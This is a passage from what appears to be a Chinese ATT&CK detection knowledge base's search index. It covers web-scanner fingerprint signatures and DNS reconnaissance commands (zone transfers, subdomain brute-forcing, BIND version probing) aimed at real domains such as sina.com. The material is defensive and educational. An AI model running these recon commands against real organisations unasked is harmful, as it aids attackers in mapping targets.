<p>\u5e38\u89c1\u626b\u63cf\u5668\u6216\u8005\u81ea\u52a8\u5316\u5de5\u5177\u7684\u7279\u5f81\uff08\u6307\u7eb9\uff09</p> <p>https://www.freebuf.com/column/156291.html</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/","title":"T1595-002-\u4e3b\u52a8\u626b\u63cf_\u6f0f\u6d1e\u626b\u63cf","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5b9e\u65bd\u653b\u51fb\u524d\u626b\u63cf\u6f0f\u6d1e\u6765\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u3002\u6f0f\u6d1e\u626b\u63cf\u901a\u5e38\u4f1a\u68c0\u67e5\u76ee\u6807\u4e3b\u673a/\u5e94\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982\uff1a\u8f6f\u4ef6\u548c\u7248\u672c\uff09\u7684\u914d\u7f6e\u662f\u5426\u6709\u653b\u51fb\u8005\u8bd5\u56fe\u5229\u7528\u7684\u6f0f\u6d1e\u3002</p> <p>\u8fd9\u4e9b\u626b\u63cf\u8fd8\u53ef\u80fd\u5305\u62ec\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f\u7b49\u5176\u5b83\u5c1d\u8bd5\uff0c\u4ece\u800c\u8bc6\u522b\u66f4\u5e38\u89c1\u7684\u53ef\u5229\u7528\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u626b\u63cf\u901a\u5e38\u662f\u901a\u8fc7\u670d\u52a1\u5668banner\u3001\u76d1\u542c\u7aef\u53e3\u6216\u5176\u4ed6\u7f51\u7edc\u5de5\u4ef6\u6765\u83b7\u53d6\u8fd0\u884c\u8f6f\u4ef6\u548c\u7248\u672c\u53f7\u3002\u626b\u63cf\u6240\u83b7\u53d6\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u6f0f\u6d1e\u5229\u7528\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5e38\u89c1\u626b\u63cf\u5668</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP\u6d41\u91cf</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\u5b9e\u6d4b\u793a\u4f8b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_6","title":"\u5e38\u89c1\u626b\u63cf\u5668\u7279\u5f81","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#awvsacunetix-web-vulnerability-scanner-10511","title":"Awvs\uff08Acunetix Web Vulnerability Scanner \uff09\u7248\u672c10.5\u548c11","text":"<p>Awvs\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f</p> <pre><code>&lt;1&gt; Url:\nacunetix-wvs-test-for-some-inexistent-file\nby_wvs\nacunetix_wvs_security_test\nacunetix\nacunetix_wvs\nacunetix_test\n</code></pre> <pre><code>&lt;2&gt; Headers:\nAcunetix-Aspect-Password:\nCookie: acunetixCookie\nLocation: acunetix_wvs_security_test\nX-Forwarded-Host: acunetix_wvs_security_test\nX-Forwarded-For: acunetix_wvs_security_test\nHost: acunetix_wvs_security_test\nCookie: acunetix_wvs_security_test\nCookie: acunetix\nAccept: acunetix/wvs\nOrigin: acunetix_wvs_security_test\nReferer: acunetix_wvs_security_test\nVia: acunetix_wvs_security_test\nAccept-Language: acunetix_wvs_security_test\nClient-IP: acunetix_wvs_security_test\nHTTP_AUTH_PASSWD: acunetix\nUser-Agent: acunetix_wvs_security_test\nAcunetix-Aspect-Queries:\u4efb\u610f\u503c\nAcunetix-Aspect:\u4efb\u610f\u503c\n</code></pre> <pre><code>&lt;3&gt; Body \uff08\u8bf7\u6c42\u7684post\u4fe1\u606f\uff09\nacunetix_wvs_security_test\nacunetix\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#netsparker","title":"Netsparker","text":"<p>Netsparker\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f</p> <pre><code>&lt;1&gt; Url\nnetsparker\nNetsparker\nns: netsparker\n</code></pre> <pre><code>&lt;2&gt; Headers\nX-Scanner: Netsparker\nLocation: Netsparker\nAccept: netsparker/check\nCookie: netsparker\nCookie: NETSPARKER\n</code></pre> <pre><code>&lt;3&gt; Body\nnetsparker\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#appscan","title":"Appscan","text":"<p>Appscan\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f</p> <pre><code>&lt;1&gt;Url\nAppscan\n</code></pre> <pre><code>&lt;2&gt; Headers\nContent-Type: Appscan\nContent-Type: AppScanHeader\nAccept: Appscan\nUser-Agent:Appscan\n</code></pre> <pre><code>&lt;3&gt; Body\nAppscan\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#webinspect","title":"Webinspect","text":"<p>Webinspect\u4f9d\u7136\u5728\u8bf7\u6c42\u7684Url\uff0cHeaders, Body\u4e09\u9879\u91cc\u968f\u673a\u5305\u542b\u4e86\u80fd\u4ee3\u8868\u81ea\u5df1\u7684\u7279\u5f81\u4fe1\u606f</p> <pre><code>&lt;1&gt; Url\nHP404\n</code></pre> <pre><code>&lt;2&gt; Headers\nUser-Agent: HP ASC\nCookie: webinspect\nX-WIPP: \u4efb\u610f\u503c\nX-Request-Memo: \u4efb\u610f\u503c\nX-Scan-Memo: \u4efb\u610f\u503c\nCookie: CustomCookie\nX-RequestManager-Memo: \u4efb\u610f\u503c\n</code></pre> <pre><code>&lt;3&gt; Body\nWebinspect\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#rsas","title":"Rsas (\u7eff\u76df\u6781\u5149)","text":"<p>Rsas \u7684\u4e3b\u8981\u7684\u7279\u5f81\u5728Url\u548cHeaders\u4e2d</p> <pre><code>&lt;1&gt; Url\nnsfocus\n</code></pre> <pre><code>&lt;2&gt; Headers\nUser-Agent: Rsas\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#nessus","title":"Nessus","text":"<p>Nessus\u7684\u7279\u5f81\u4e3b\u8981\u5728Url\uff0cHeaders\uff0cBody\u4e2d</p> <pre><code>&lt;1&gt; Url\nnessus\nNessus\n</code></pre> <pre><code>&lt;2&gt; Headers\nx_forwarded_for: nessus\nreferer: nessus\nhost: nessus\n</code></pre> <pre><code>&lt;3&gt; Body\nnessus\nNessus\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#webreaver","title":"WebReaver","text":"<p>WebReaver\u7684\u7279\u5f81\u53ea\u5728Headers\u4e2d\u7684UA\u4e2d</p> <pre><code>&lt;1&gt; Headers\nUser-Agent: WebReaver\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#sqlmap","title":"Sqlmap","text":"<p>Sqlmap\u5728Url\uff0cHeaders\uff0cBody\u4e2d\u90fd\u542b\u6709\u7279\u5f81\u503c</p> <pre><code>&lt;1&gt; Url\nsqlmap\n</code></pre> <pre><code>&lt;2&gt; Headers\nUser-Agent: sqlmap\uff08\u540e\u63a5\u7248\u672c\u53f7\uff0c\u8ddf\u5f53\u524d\u7248\u672c\u6709\u5173\u7cfb\uff09\n</code></pre> <pre><code>&lt;3&gt; Body\nsqlmap\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#nmap","title":"NMAP","text":"<p>\u6700\u8fd1\u505a\u5206\u6790\u76d1\u6d4b\u5230\u7684\u7279\u5f81</p> <pre><code>user-agent\uff1aNmap Scripting Engine; https://nmap.org/book/nse.html\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_7","title":"\u5efa\u8bae","text":"<p>\u76d1\u63a7\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u7684\u53ef\u7591\u7f51\u7edc\u6d41\u91cf\uff0c\u4f8b\u5982\u6765\u81ea\u5355\u4e2a\u6e90\u7684\u5927\u91cf\u6d41\u91cf\uff08\u5c24\u5176\u662f\u5982\u679c\u5df2\u77e5\u8be5\u6e90\u4e0e\u653b\u51fb\u8005\u6216\u50f5\u5c38\u7f51\u7edc\u76f8\u5173\u8054\uff09\u3002\u5206\u6790Web\u8bbf\u95ee\u6570\u636e\u4e5f\u53ef\u80fd\u4f1a\u53d1\u73b0\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u7684\u7279\u5f81\uff0c\u4f8b\u5982referer\u503c\u6216HTTP/S\u4e2d\u7684user-agent\u5b57\u6bb5\u91cc\u5b57\u7b26\u4e32\u3002</p> <p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-002-%E4%B8%BB%E5%8A%A8%E6%89%AB-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1595-002</p> <p>https://attack.mitre.org/techniques/T1595/002/</p> <p>\u5e38\u89c1\u626b\u63cf\u5668\u6216\u8005\u81ea\u52a8\u5316\u5de5\u5177\u7684\u7279\u5f81\uff08\u6307\u7eb9\uff09</p> <p>https://www.freebuf.com/column/156291.html</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/","title":"T1596-001-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-DNS/\u88ab\u52a8DNS","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u5728DNS\u6570\u636e\u4e2d\u641c\u7d22\u53ef\u5728\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4f7f\u7528\u4fe1\u606f\u3002DNS\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6ce8\u518c\u7684\u540d\u79f0\u670d\u52a1\u5668\u4ee5\u53ca\u6982\u8ff0\u76ee\u6807\u5b50\u57df\uff0c\u90ae\u4ef6\u670d\u52a1\u5668\u548c\u5176\u4ed6\u4e3b\u673a\u7684\u5730\u5740\u7684\u8bb0\u5f55\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22DNS\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u76f4\u63a5\u67e5\u8be2\u76ee\u6807\u7ec4\u7ec7\u7684\u540d\u79f0\u670d\u52a1\u5668\uff0c\u4e5f\u53ef\u4ee5\u641c\u7d22\u8bb0\u5f55\u7684DNS\u67e5\u8be2\u54cd\u5e94\u7684\u96c6\u4e2d\u5b58\u50a8\u5e93\uff08\u79f0\u4e3a\u88ab\u52a8DNS\uff09\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5bfb\u6c42\u5e76\u9488\u5bf9\u5185\u90e8\u7f51\u7edc\u4fe1\u606f\u7684DNS\u9519\u8bef\u914d\u7f6e\u6216\u6cc4\u6f0f\u3002\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u59a5\u534f\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u521d\u6b65\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\uff09\u8fdc\u7a0b\u670d\u52a1\u6216\u4fe1\u4efb\u5173\u7cfb\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4fe1\u606f\u6536\u96c6--DNS\u4fe1\u606f\u6536\u96c6</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#nslookup","title":"NSLOOKUP","text":"<p>\u89e3\u6790A\u8bb0\u5f55\u3001MX\u8bb0\u5f55\u3001NS\u8bb0\u5f55</p> <pre><code>\u7ec8\u7aef\u4e2d\u8f93\u5165 \uff1anslookup\n\u5728\u663e\u793a\u7684\u9875\u9762\u4e2d\u8f93\u5165\u57df\u540d\uff0c\u4f1a\u89e3\u6790\u51fa\u6700\u7ec8\u7684A\u8bb0\u5f55\u548cIP\u5730\u5740\n&gt;set type=a      # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aA\u8bb0\u5f55\uff08\u4e3b\u673a\u8bb0\u5f55\uff09\n&gt;set type=mx     # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aMX\u8bb0\u5f55\uff08\u90ae\u4ef6\u4ea4\u6362\u8bb0\u5f55\u00b7\uff09\n&gt;set type=ns     # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aNS\u8bb0\u5f55\uff08\u57df\u540d\u670d\u52a1\u5668\u8bb0\u5f55\uff09\n&gt;sina.com        # \u67e5\u8be2 sina.com \u8fd9\u4e2a\u57df\u540d\n</code></pre> <p>\u53cd\u5411\u57df\u540d\u89e3\u6790</p> <pre><code>\u4f7f\u7528IP\u53cd\u5411\u89e3\u6790\u51fa\u57df\u540d\uff08ptr\uff09\n&gt;set type=ptr\n&gt; 66.102.251.24\n</code></pre> <p>\u6307\u5b9aserver IP</p> <pre><code>&gt;server 8.8.8.8        # \u6307\u5b9a\u6211\u4eec\u60f3\u8981\u6307\u5b9a\u7684DNS\u670d\u52a1\u5668\u7684IP\uff0c\u4f7f\u7528\u8be5\u670d\u52a1\u5668\u6765\u8fdb\u884c\u67e5\u8be2\n&gt;www.sina.com\n</code></pre> <p>\u6307\u5b9a\u6240\u6709\u7c7b\u578b</p> <pre><code>&gt;set type=any    # \u6307\u5b9a\u67e5\u8be2\u6240\u6709\u7c7b\u578b\u7684\u8bb0\u5f55\n&gt;www.sina.com\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#dig","title":"DIG","text":"<p>\u67e5\u8be2\u6240\u6709\u8bb0\u5f55</p> <pre><code>dig sina.com any @8.8.8.8\n# \u67e5\u8be2 sina.com \u7684\u6240\u6709\u7c7b\u578b\u7684\u8bb0\u5f55\uff0c\u5e76\u6307\u5b9aIP\u5730\u5740\u4e3a 8.8.8.8\n# \u5efa\u8bae\u6307\u5b9a\u4e0d\u540c\u7684\u57df\u540d\u670d\u52a1\u5668IP\u5bf9\u540c\u4e00\u4e2a\u57df\u540d\u8fdb\u884c\u89e3\u6790\uff08\u6bd4\u8f83\u7ed3\u679c\uff0c\u786e\u5b9a\u67e5\u8be2\u7684\u51c6\u786e\u6027\uff09\n</code></pre> <p>\u7b5b\u9009\u8f93\u51fa\u7ed3\u679c</p> <pre><code>dig mail.163.com any\n# \u67e5\u8be2163\u7684mail\u7684\u8bb0\u5f55\n\ndig +noall mail.163.com any \n# +noall\u7b5b\u9009\u8f93\u51fa\u7ed3\u679c\uff08\u5373\u4ec0\u4e48\u7ed3\u679c\u90fd\u4e0d\u8f93\u51fa\uff09\n\ndig +noall +answer mail.183.com any \n# \u53ea\u663e\u793a\u6211\u4eec\u6700\u7ec8\u60f3\u8981\u7684\u7ed3\u679c\n</code></pre> <p>\u53cd\u5411\u67e5\u8be2\uff08ptr\uff09</p> <pre><code>dig -x  66.102.251.24\n# \u53cd\u5411\u67e5\u8be2\u8be5IP\u5730\u5740\u7684ptr\u8bb0\u5f55\uff0c\u5f97\u5230\u5176\u57df\u540d\n</code></pre> <p>\u67e5\u8be2DNS\u670d\u52a1\u5668\u7684bind\u7248\u672c\u4fe1\u606f</p> <pre><code># \u5728Linux\u548cUnix\u670d\u52a1\u5668\u4e2d\u63d0\u4f9b\u7684DNS\u670d\u52a1\u7684\u8f6f\u4ef6\u5305\u4e00\u822c\u90fd\u662fbind\n# \u5728\u83b7\u5f97bind\u4fe1\u606f\u540e\u5c31\u53ef\u4ee5\u67e5\u770b\u5b83\u7684bind\u6709\u54ea\u4e9b\u6f0f\u6d1e\uff0c\u4f9d\u636e\u8fd9\u4e9b\u6f0f\u6d1e\u83b7\u5f97\u6240\u6709\u7684DNS\u8bb0\u5f55\n\ndig +noall +answer txt chaos VERSION.BIND @mail.163.com\n#   \u8fc7\u6ee4\u7b5b\u9009\u8f93\u51fa    \u6587\u672c bind\u7684class\u7c7b\u578b     \u57df\u540d\n</code></pre> <p>\u5bf9DNS\u8bb0\u5f55\u8fdb\u884c\u8ffd\u8e2a\uff08DNS\u8ffd\u8e2a\uff09</p> <pre><code>dig +trace www.sina.com\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#dns","title":"DNS\u533a\u57df\u4f20\u8f93","text":"<p>DNS\u533a\u57df\u4f20\u8f93\u662f\u53d1\u751f\u5728DNS\u670d\u52a1\u5668\u4e4b\u95f4\u4fe1\u606f\u540c\u6b65\u7684\u4e00\u4e2a\u8fc7\u7a0b\uff08\u533a\u57df\u4f20\u8f93\u673a\u5236\uff0c\u901a\u5e38\u53ea\u53d1\u751f\u5728\u672c\u57df\u57df\u540d\u670d\u52a1\u5668\u4e4b\u95f4\uff09\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u88ab\u5c1d\u8bd5\u7528\u6765\u83b7\u53d6\u6240\u6709\u7684DNS\u8bb0\u5f55\u4fe1\u606f</p> <pre><code>dig @ns1.sina.com sina.com axfr\n#    \u5148\u6307\u5b9ans\u670d\u52a1\u5668         \u53d1\u8d77\u533a\u57df\u4f20\u8f93\u7684\u6307\u4ee4\n# DNS\u670d\u52a1\u5668\u7684\u57df\u540d\u67e5\u8be2\u4e00\u822c\u90fd\u662fUDP\u768453\u7aef\u53e3\uff0c\u533a\u57df\u4f20\u8f93\u5373\u57df\u540d\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u540c\u6b65\u6570\u636e\u4f7f\u7528TCP\u768453\u7aef\u53e3\n\nhost -T -l sina.com ns1.sina.com\n# -T:\u663e\u793a\u65f6\u95f4  -l:\u8fdb\u884cAXFR\u7684\u5168\u533a\u57df\u4f20\u8f93  \n# \u5982\u679c\u662f\u67e5\u8be2 sina.com \u7684\u8bdd\uff0c\u540e\u9762\u4e00\u5b9a\u8981\u8ddf\u4e00\u4e2a sina \u7684\u57df\u540d\u670d\u52a1\u5668\u7684\u5730\u5740\uff08\u67e5\u8be2\u4ec0\u4e48\u8ddf\u4ec0\u4e48\uff09\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#dns_1","title":"DNS\u5b57\u5178\u7206\u7834","text":"<p>\u51c6\u5907\u4e00\u4e2a\u5305\u542b\u5e38\u89c1\u4e3b\u673a\u8bb0\u5f55\u540d\u79f0\u7684\u5b57\u5178\uff0c\u7528\u5b57\u5178\u5411DNS\u670d\u52a1\u5668\u53d1\u8d77\u4e00\u4e2a\u5b57\u5178\u5f0f\u7684\u66b4\u529b\u7834\u89e3\u3002\u5982\u679c\u6709\u8fd9\u4e2a\u8bb0\u5f55\uff0cDNS\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56de\u5176\u5bf9\u5e94\u7684IP\u5730\u5740\u3002\u5982\u679c\u6ca1\u6709\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\u7684\u7ed3\u679c\uff08\u5c1d\u8bd5\u5c06\u76ee\u6807\u670d\u52a1\u5668\u91cc\u9762\u7684\u6240\u6709\u7684\u4e3b\u673a\u8bb0\u5f55\u548c\u5b50\u57df\u7684\u57df\u540d\u8bb0\u5f55\u7ed9\u7206\u7834\u51fa\u6765\uff09</p> <p>dnsenum</p> <pre><code>sudo apt install dnsenum        # \u5b89\u88c5dnsenum\ndnsenum -f dns.txt -dnsserver 8.8.8.8 sina.com -o sina.xml\n# -o\uff1a\u628a\u7206\u7834\u51fa\u6765\u7684\u5185\u5bb9\u4fdd\u5b58\u6210\u4e00\u4e2axml\u6587\u4ef6\uff0c-f\uff1a\u6307\u5b9a\u5b57\u5178\u6587\u4ef6\n</code></pre> <p>dnsmap</p> <pre><code>sudo apt install dnsmap    # \u5b89\u88c5dnsmap\ndnsmap sina.com -w dns.txt\n# -w\uff1a\u7528\u6765\u6307\u5b9a\u5b57\u5178\u6587\u4ef6\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#dnswhois","title":"DNS\u6ce8\u518c\u4fe1\u606f\uff08whois\u67e5\u8be2\uff09","text":"<p>\u6536\u96c6DNS\u7684\u6ce8\u518c\u4fe1\u606f\uff0c\u6bd4\u5982\u6ce8\u518c\u65b0\u6d6asina.com\u7684\u4fe1\u606f\u3002\u6709\u7684\u57df\u540d\u5728\u6ce8\u518c\u65f6\u4f1a\u7559\u4e0b\u6ce8\u518c\u4eba\u7684\u59d3\u540d\u3001\u7535\u8bdd\u3001\u90ae\u7bb1\u3001\u516c\u53f8\u5730\u5740\u7b49\u7b49\u4fe1\u606f\uff08\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u793e\u4f1a\u5de5\u7a0b\u5b66\u6216\u8005\u7269\u7406\u653b\u51fb\u7684\u624b\u6bb5\uff09\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7whois\u6765\u67e5\u8be2\u8fd9\u4e9b\u4fe1\u606f\u3002\u4e0d\u540c\u5730\u533a\u3001\u533a\u57df\u6709\u4e0d\u540c\u5730\u533a\u7684whois\u4fe1\u606f\uff0c\u90a3\u4e2a\u56fd\u5bb6\u7528\u90a3\u4e2aNIC\u5fc5\u987b\u5206\u914d\u540e\u624d\u80fd\u4f7f\u7528\uff0c\u4e0d\u80fd\u968f\u4fbf\u4e71\u7528\uff0c\u5426\u8005\u4f1a\u9020\u6210\u4e92\u8054\u7f51\u4e0a\u7684\u6df7\u4e71\uff0c\u800c\u4e14\u53ef\u80fd\u51fa\u73b0\u91cd\u590d\u7684IP\u5730\u5740\u3002\u6700\u65e9\u7684IP\u5206\u914d\u5c31\u662f\u7531InterNic\u6765\u5b8c\u6210\u7684\uff0c\u540e\u6765\u4e0d\u540c\u5730\u533a\u6210\u7acb\u4e86\u4e00\u4e9b\u5730\u533a\u6027\u8d28\u7684NIC\uff0c\u4e9a\u592a\